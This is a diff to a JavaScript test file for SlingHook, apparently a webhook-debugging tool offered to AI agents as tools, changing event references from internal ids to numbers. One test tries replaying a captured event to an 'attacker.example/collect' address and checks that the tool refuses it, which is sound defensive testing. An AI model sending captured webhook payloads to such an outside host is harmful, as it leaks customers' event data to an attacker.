@@ -15,8 +15,10 @@ import { expectsRejection, findBaseline, isPassing, verdictFor } from '../src/mc
 const UUID = '4e6acf98-9df8-49bc-8783-45a4d01d4eef';
 const BIN = fileURLToPath(new URL('../bin/slinghook.js', import.meta.url));
 
+// id is SlingHook's internal key; agents only ever see and type the number
 const LOG = {
     id: 42,
+    number: 7,
     endpoint_id: 1,
     method: 'POST',
     ip_address: '203.0.113.5',
@@ -63,8 +65,13 @@ function fakeApi({ plan = 'free', role = 'owner' } = {}) {
             if (plan === 'free') return send(403, { error: 'Searching your full history needs Pro', upgrade: true });
             return send(200, { logs: [{ id: 40 }], next_before_id: 40 });
         }
+        if (route === 'GET /api/logs/resolve') {
+            if (['7', '#7', 'latest', 'latest invoice.paid', 'evt_1'].includes(url.searchParams.get('ref'))) {
+                return send(200, { log: { id: 42, number: 7, event_type: 'invoice.paid' }, ref_kind: 'number' });
+            }
+            return send(404, { error: 'No event matches that reference' });
+        }
         if (route === 'GET /api/logs/42') return send(200, { log: LOG });
-        if (route === 'GET /api/logs/99') return send(404, { error: 'Log not found or access denied' });
         if (route === 'GET /api/logs/42/signature' || route === 'POST /api/logs/42/signature') {
             return send(200, { diagnosis: { status: 'invalid', reason: 'wrong_secret', message: 'Signed with a different secret', used_candidate_secret: req.method === 'POST' } });
         }
@@ -137,18 +144,22 @@ test('runs the catch, debug, replay loop end to end', async () => {
 
         // A slug works as the endpoint, and filters apply within the newest window
         const listed = parse(await client.callTool({ name: 'list_events', arguments: { endpoint: 'stripe-dev', signature: 'invalid' } }));
-        assert.deepEqual(listed.events.map((e) => e.id), [42]);
+        assert.deepEqual(listed.events.map((e) => e.number), [7]);
+        assert.ok(listed.events.every((e) => !('id' in e)), 'the internal id is never shown');
         assert.ok(api.requests.some((r) => r.path === '/api/logs' && r.query.endpoint === UUID && r.query.limit === '50'));
 
-        const event = parse(await client.callTool({ name: 'get_event', arguments: { event_id: 42 } }));
+        const event = parse(await client.callTool({ name: 'get_event', arguments: { event_id: 7 } }));
+        assert.equal(event.number, 7);
+        assert.equal(event.id, undefined);
         assert.equal(event.event_type, 'invoice.paid');
         assert.match(event.body, /\n {2}"type": "invoice.paid"/);
         assert.ok(event.body_pretty_printed);
 
-        const diagnosis = parse(await client.callTool({ name: 'debug_signature', arguments: { event_id: 42, secret: 'whsec_try' } }));
+        const diagnosis = parse(await client.callTool({ name: 'debug_signature', arguments: { event_id: '#7', secret: 'whsec_try' } }));
         assert.equal(diagnosis.used_candidate_secret, true);
 
-        const replay = parse(await client.callTool({ name: 'replay_event', arguments: { event_id: 42, target_url: handler.url } }));
+        const replay = parse(await client.callTool({ name: 'replay_event', arguments: { event_id: 'latest invoice.paid', target_url: handler.url } }));
+        assert.equal(replay.event, 7);
         // Event 42's signature is invalid, so the handler accepting it is a failure (#92)
         assert.equal(replay.status, 200);
         assert.equal(replay.passed, false);
@@ -160,7 +171,8 @@ test('runs the catch, debug, replay loop end to end', async () => {
         assert.equal(handler.received[0].headers['x-webhook-replay'], 'true');
         assert.ok(api.requests.some((r) => r.method === 'POST' && r.path === '/api/logs/42/replays' && r.body.response_status === 200));
 
-        const result = parse(await client.callTool({ name: 'get_replay_result', arguments: { event_id: 42 } }));
+        const result = parse(await client.callTool({ name: 'get_replay_result', arguments: { event_id: 'evt_1' } }));
+        assert.equal(result.event, 7);
         assert.equal(result.verdict, 'still_failing');
         assert.match(result.expected_outcome, /should reject it/);
         assert.equal(result.replays, 2);
@@ -181,10 +193,11 @@ test('errors come back as tool results the model can act on', async () => {
         assert.match(search.content[0].text, /needs Pro.*50 newest events/);
 
         const missing = await client.callTool({ name: 'get_event', arguments: { event_id: 99 } });
+        assert.ok(api.requests.some((r) => r.path === '/api/logs/resolve' && r.query.ref === '99'));
         assert.equal(missing.isError, true);
         assert.match(missing.content[0].text, /list_events/);
 
-        const remote = await client.callTool({ name: 'replay_event', arguments: { event_id: 42, target_url: 'https://attacker.example/collect' } });
+        const remote = await client.callTool({ name: 'replay_event', arguments: { event_id: 7, target_url: 'https://attacker.example/collect' } });
         assert.equal(remote.isError, true);
         assert.match(remote.content[0].text, /--allow-remote-targets/);
         assert.ok(!api.requests.some((r) => r.path === '/api/logs/42/replays'), 'nothing was sent or recorded');
@@ -198,7 +211,7 @@ test('viewers cannot replay', async () => {
     const api = await fakeApi({ role: 'viewer' });
     const tools = createTools({ api: apiClient(api.url), server: api.url });
     const replay = tools.find((t) => t.name === 'replay_event');
-    await assert.rejects(replay.handler({ event_id: 42, target_url: 'http://localhost:3000/hook' }), /viewer/);
+    await assert.rejects(replay.handler({ event_id: 7, target_url: 'http://localhost:3000/hook' }), /viewer/);
     api.server.close();
 });
 
@@ -208,7 +221,7 @@ test('a handler that rejects an invalid signature passes', async () => {
     const tools = createTools({ api: apiClient(api.url), server: api.url });
     const replay = tools.find((t) => t.name === 'replay_event');
 
-    const result = await replay.handler({ event_id: 42, target_url: handler.url });
+    const result = await replay.handler({ event_id: 7, target_url: handler.url });
     assert.equal(result.passed, true);
     assert.equal(result.verdict, 'fixed');
 
@@ -223,10 +236,10 @@ test('caps replays per minute', async () => {
     const tools = createTools({ api: apiClient(api.url), server: api.url, now: () => clock });
     const replay = tools.find((t) => t.name === 'replay_event');
 
-    for (let i = 0; i < 10; i++) await replay.handler({ event_id: 42, target_url: handler.url });
-    await assert.rejects(replay.handler({ event_id: 42, target_url: handler.url }), /at most 10 a minute/);
+    for (let i = 0; i < 10; i++) await replay.handler({ event_id: 7, target_url: handler.url });
+    await assert.rejects(replay.handler({ event_id: 7, target_url: handler.url }), /at most 10 a minute/);
     clock += 60_001;
-    const again = await replay.handler({ event_id: 42, target_url: handler.url });
+    const again = await replay.handler({ event_id: 7, target_url: handler.url });
     assert.equal(again.verdict, 'still_failing');
 
     api.server.close();
